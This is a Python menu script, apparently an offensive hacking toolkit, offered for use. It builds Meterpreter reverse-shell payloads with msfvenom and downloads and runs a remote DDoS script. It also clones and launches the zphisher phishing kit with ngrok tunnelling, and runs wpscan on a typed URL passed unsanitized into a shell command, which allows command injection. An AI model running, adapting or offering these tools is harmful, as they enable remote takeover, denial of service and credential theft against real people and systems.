import os, time

#   <--Menu-->
def menu():
    os.system("clear")
    print(chr(27)+"[1;31m"+"Y0RKOX M3NU")
    print(chr(27)+"[1;35m"+"")
    time.sleep(1)
    print("1 -->> MsfVenom T00L")
    time.sleep(1)
    print("2 -->> DDoS T00LS")
    time.sleep(1)
    print("3 -->> Phishing")
    time.sleep(1)
    print("4 -->> Wpscan")
    time.sleep(1)
    print("5 -->> Exit")
    print(chr(27)+"[1;32m"+"")
    time.sleep(1)
    option = input("--->> ")
    print(chr(27)+"[1;34m"+"")
    
    if option == "1":
        msf()

    if option == "2":
        ddos()

    if option == "3":
        phishing()
    
    if option == "4":
        wpscan()

    if option == "5":
        print("Bye...")
        time.sleep(1)
        os.system("clear")
        exit()

def msf():
    os.system("clear")
    print(chr(27)+"[1;31m"+"Metasploit")
    print("")
    print("1 -->> Windows reverse shell")
    print("2 -->> Linux reverse shell x86")
    print("3 -->> Linux reverse shell x64")
    print("4 -->> Exit")
    print("")
    x = input("--->> ")
    print("")
    if x == "1":
        print(chr(27)+"[1;32m"+"")
        print("Creating payload...")
        os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=443 -f exe > download.exe")
        print(chr(27)+"[1;31m"+"FileName == download.exe")
        time.sleep(3)
        while True:
            msf()
    
    if x == "2":
        print(chr(27)+"[1;32m"+"")
        print("Creating payload...")
        os.system("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=443 -f elf > downloadx86.elf")
        print(chr(27)+"[1;31m"+"FileName == downloadx86.elf")
        time.sleep(3)
        while True:
            msf()

    if x == "3":
        print(chr(27)+"[1;32m"+"")
        print("Creating payload...")
        os.system("msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=443 -f elf > downloadx64.elf")
        print(chr(27)+"[1;31m"+"FileName == downloadx64.elf")
        time.sleep(3)
        while True:
            msf()
    
    if x == "4":
        menu()

def ddos():
    os.system("clear")
    print(chr(27)+"[1;31m"+"DDOS")
    print("")
    print("1 -->> Download tool")
    print("2 -->> Execute tool")
    print("3 -->> Exit")
    print("")
    x = input("--->> ")
    print("")
    if x == "1":
        print(chr(27)+"[1;32m"+"")
        print("Downloading...")
        time.sleep(1)
        os.system("wget https://raw.githubusercontent.com/yorkox0/exaple01/main/ddos.py")
        print(chr(27)+"[1;31m"+"Download Succesfull!!")
        time.sleep(2)
        while True:
            ddos()
    
    if x == "2":
        print("")
        print("Executting...")
        time.sleep(1)
        os.system("python3 ddos.py")

    if x == "3":
        menu()

def phishing():
    os.system("clear")
    print(chr(27)+"[1;31m"+"Phishing")
    print("")
    print("1 -->> Download tool")
    print("2 -->> Execute tool")
    print("3 -->> Exit")
    print("")
    x = input("--->> ")
    print("")
    if x == "1":
        print(chr(27)+"[1;32m"+"")
        print("Downloading...")
        time.sleep(1)
        os.system("git clone https://github.com/htr-tech/zphisher")
        print("")
        print("Downloading Ngrok...")
        time.sleep(1)
        os.system("curl https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip -o unzip.zip")
        os.system("unzip unzip.zip")
        os.system("rm unzip.zip")
        print("Done!!")
        time.sleep(1)
        while True:
            phishing()
    
    if x == "2":
        print("")
        print("Executting...")
        time.sleep(1)
        os.system("mv zphisher/.sites .")
        time.sleep(1)
        os.system("bash zphisher/zphisher.sh")

    if x == "3":
        menu()

def wpscan():
    print(chr(27)+"[1;31m"+"")
    os.system("clear")
    print("1 -->> Download")
    print("2 -->> Execute")
    print("3 -->> Exit")
    print("")
    x = input("-->> ")
    if x == "1":
        print(chr(27)+"[1;31m"+"")
        print("1 -->> Debian")
        print("2 -->> Arch")
        print("")
        x = input("-->> ")
        if x == "1":
            print(chr(27)+"[1;31m"+"")
            os.system("sudo apt install wpscan")
            print("Done!!")
            while True:
                wpscan()
        if x == "2":
            print(chr(27)+"[1;31m"+"")
            os.system("sudo pacman -S wpscan")
            print("Done!!")
            while True:
                wpscan()
        if x == "3":
            menu()

    if x == "2":
        print("")
        web = input("Web with https:// -->> ")
        os.system("wpscan --url "+web+" >> analisis.txt")
        print("")
        print("Saved on analisis.txt")
        time.sleep(3)
        while True:
            menu()

print(chr(27)+"[1;36m"+"Created by Yorkox")
print(chr(27)+"[1;31m"+"")
if input("Continue? s/n --->> ") == "s":
    menu()
else:
    exit("Bye")
